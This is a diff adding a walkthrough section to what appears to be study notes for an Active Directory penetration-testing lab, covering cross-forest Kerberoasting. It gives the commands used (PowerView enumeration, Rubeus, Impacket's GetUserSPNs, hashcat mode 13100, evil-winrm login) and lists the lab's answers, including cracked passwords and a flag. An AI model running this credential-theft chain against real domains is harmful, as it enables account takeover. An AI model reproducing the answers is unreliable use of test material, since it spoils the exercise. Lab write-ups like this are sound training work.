@@ -33,6 +33,9 @@
     1. [Domain Trusts Primer](#domain-trusts-primer)
     2. [Attacking Domain Trusts - Child -> Parent Trusts - from Windows](#attacking-domain-trusts---child---parent-trusts---from-windows)
     3. [Attacking Domain Trusts - Child -> Parent Trusts - from linux](#attacking-domain-trusts---child---parent-trusts---from-linux)
+10. [Breaking Down Boundaries](#breaking-down-boundaries)
+    1. [Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows](#attacking-domain-trusts---cross-forest-trust-abuse---from-windows)
+    2. [Attacking Domain Trusts - Cross-Forest Trust Abuse - from linux](#attacking-domain-trusts---cross-forest-trust-abuse---from-linux)
 
 ## Initial Enumeration
 ### External Recon and Enumeration Principles
@@ -723,7 +726,60 @@ With this data collected, the attack can be performed with Mimikatz. Here the an
     ```
     The answer is `49a074a39dd0651f647e765c2cc794c7`.
 
+## Breaking Down Boundaries
+### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+#### Challenges
+1. Perform a cross-forest Kerberoast attack and obtain the TGS for the mssqlsvc user. Crack the ticket and submit the account's cleartext password as your answer.
 
+    First we need to confirm that mssqlsvc user is present in the FREIGHTLOGISTIC.LOCAL domain.
 
+    ```powershell
+    Import-Module .\PowerView.ps1 
+    Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+    ```
+    Once we confirm it, we can use `Rubeus` to get the hash.
 
+    ```powershell
+    .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+    ```
+    Then we can use `hashcat` with mode `13100` to crack it.
 
+    ```bash
+    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
+    ```
+    The answer is `1logistics`.
+
+### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+#### Challenges
+1. Kerberoast across the forest trust from the Linux attack host. Submit the name of another account with an SPN aside from MSSQLsvc.
+
+    We can solve this by using `GetUserSPNs.py`.
+
+    ```bash
+    GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+    ```
+
+    The answer is `sapsso`.
+
+2. Crack the TGS and submit the cleartext password as your answer.
+
+    We can solve this by using `GetUserSPNs.py` again with `-request` flag.
+
+    ```bash
+    GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+    ```
+    Once we have the hash, we can crack it by using `haschat` with mode `13100`.
+
+    ```bash
+    hashcat -m 13100 crack /usr/share/wordlists/rockyou.txt
+    ```
+    The answer is `pabloPICASSO`.
+
+3. Log in to the ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL Domain Controller using the Domain Admin account password submitted for question #2 and submit the contents of the flag.txt file on the Administrator desktop.
+
+    We can login by using `evil-winrm`.
+
+    ```bash
+    evil-winrm -i ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -u sapsso -p 'pabloPICASSO'
+    ```
+    Once we logged in, we can read the flag. The answer is `burn1ng_d0wn_th3_f0rest!`.
